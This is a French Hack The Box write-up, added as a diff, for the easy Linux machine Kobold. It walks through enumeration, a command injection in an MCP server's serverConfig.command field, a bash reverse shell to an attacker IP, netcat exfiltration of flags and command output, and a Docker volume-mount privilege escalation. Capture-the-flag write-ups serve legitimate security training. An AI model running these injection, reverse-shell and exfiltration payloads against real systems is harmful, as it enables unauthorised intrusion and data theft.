@@ -1,0 +1,207 @@
+# 🧠 HTB Write-up : Kobold (Facile)
+
+| **Machine** | Kobold |
+| **Difficulté** | Facile |
+| **OS** | Linux |
+| **Release** | Saison 10 |
+| **Techniques** | Énumération Web, API, injection de commande, contournement Docker, élévation de privilèges |
+
+---
+
+## 📌 Résumé
+
+Kobold est une machine Linux facile qui démontre une chaîne d'attaque réaliste :
+
+1. **Énumération** des ports et services
+2. **Découverte** d'une spécification OpenAPI exposée
+3. **Fuzzing** de sous-domaines → `mcp.kobold.htb`
+4. **Identification** d'une vulnérabilité d'injection de commande (CVE-2026-23520)
+5. **Accès initial** → shell en tant que `ben`
+6. **Élévation de privilèges** via Docker (montage du système hôte)
+
+---
+
+## 🔍 Reconnaissance
+
+### Scan Nmap
+
+```bash
+nmap -sCV -A 10.129.16.17
+Ports ouverts :
+
+Port	Service	Information
+22/tcp	SSH	OpenSSH 9.6p1 Ubuntu
+80/tcp	HTTP	Nginx 1.24.0 → redirige vers kobold.htb
+443/tcp	HTTPS	Nginx 1.24.0 → certificat pour *.kobold.htb
+Configuration du fichier hosts
+bash
+echo "10.129.16.17 kobold.htb mcp.kobold.htb" | sudo tee -a /etc/hosts
+🔌 Énumération API (port 3552)
+Découverte de l'OpenAPI
+bash
+curl http://kobold.htb:3552/
+Résultat : Exposition d'une spécification OpenAPI complète.
+
+Endpoints identifiés :
+
+/auth/login (username/password)
+
+/auth/refresh (JWT)
+
+/api/keys (création de clés API)
+
+⚠️ Les clés API ne sont affichées qu'une seule fois.
+
+🌐 Énumération des sous-domaines
+Fuzzing avec ffuf
+bash
+ffuf -u https://kobold.htb -H "Host: FUZZ.kobold.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 149
+Sous-domaine découvert :
+
+text
+mcp.kobold.htb
+🔌 API Enumération (sous-domaine)
+Test de l'endpoint
+bash
+curl -k https://mcp.kobold.htb/api/mcp/connect
+Résultat :
+
+Redirection 301 (HTTP → HTTPS)
+
+Endpoint vulnérable identifié : /api/mcp/connect
+
+💥 Accès initial : CVE-2026-23520 (Injection de commande)
+Vulnérabilité
+CVE : CVE-2026-23520
+
+Service : Arcane MCP Server
+
+Paramètre vulnérable : serverConfig.command
+
+Score CVSS : 9.8 (Critique)
+
+Reverse shell
+Listener (attaquant) :
+
+bash
+nc -lvnp 4444
+Payload injecté :
+
+json
+{
+  "serverConfig": {
+    "command": "bash -c 'bash -i >& /dev/tcp/10.10.14.129/4444 0>&1'"
+  }
+}
+Exécution :
+
+bash
+curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
+  -H "Content-Type: application/json" \
+  -d '{"serverConfig":{"command":"bash -c \"bash -i >& /dev/tcp/10.10.14.129/4444 0>&1\""}}'
+✅ Shell reçu en tant que ben
+
+🚩 Flag utilisateur
+Récupération directe
+Listener :
+
+bash
+nc -lvnp 4445
+Payload :
+
+json
+{
+  "serverConfig": {
+    "command": "cat /home/ben/user.txt | nc 10.10.14.129 4445"
+  }
+}
+Flag :
+
+text
+********************************
+🔐 Énumération des privilèges
+Vérification des groupes (commande id)
+Listener :
+
+bash
+nc -lvnp 4446
+Payload :
+
+json
+{
+  "serverConfig": {
+    "command": "id | nc 10.10.14.129 4446"
+  }
+}
+Résultat :
+
+text
+uid=1001(ben) gid=37(operator) groups=37(operator)
+❌ Le groupe docker n'apparaît pas (car exécution non interactive)
+
+🐳 Énumération Docker (avec sg)
+Activation du groupe Docker
+Listener :
+
+bash
+nc -lvnp 4447
+Payload :
+
+json
+{
+  "serverConfig": {
+    "command": "sg docker -c 'docker images' | nc 10.10.14.129 4447"
+  }
+}
+Images Docker disponibles :
+
+text
+mysql
+privatebin/nginx-fpm-alpine
+✅ Docker accessible
+
+⚡ Élévation de privilèges (Docker breakout)
+Montage du système hôte
+Listener :
+
+bash
+nc -lvnp 4448
+Payload :
+
+json
+{
+  "serverConfig": {
+    "command": "sg docker -c 'docker run --rm -v /:/hostfs alpine cat /hostfs/root/root.txt' | nc 10.10.14.129 4448"
+  }
+}
+Flag root
+text
+********************************
+📁 Flags
+Flag	Emplacement
+Utilisateur	/home/ben/user.txt
+Root	/root/root.txt
+🧰 Outils utilisés
+Outil	Rôle
+nmap	Scan de ports et services
+ffuf	Fuzzing de sous-domaines
+curl	Requêtes HTTP/HTTPS
+nc (netcat)	Reverse shell et exfiltration
+sg	Commutation de groupe sous Linux
+🔗 Références
+CVE-2026-23520 - Arcane MCP Server Command Injection
+
+Docker breakout techniques
+
+🧠 Leçons apprises
+Toujours énumérer les ports non standards
+
+Les spécifications OpenAPI exposées révèlent souvent des endpoints sensibles
+
+Les sous-domaines peuvent cacher des applications vulnérables
+
+L'absence de groupe docker dans id ne signifie pas que Docker est inaccessible
+
+sg docker -c "commande" permet d'exécuter des commandes avec les privilèges Docker
+
+Un simple montage de volume Docker (-v /:/hostfs) suffit souvent pour lire les fichiers root
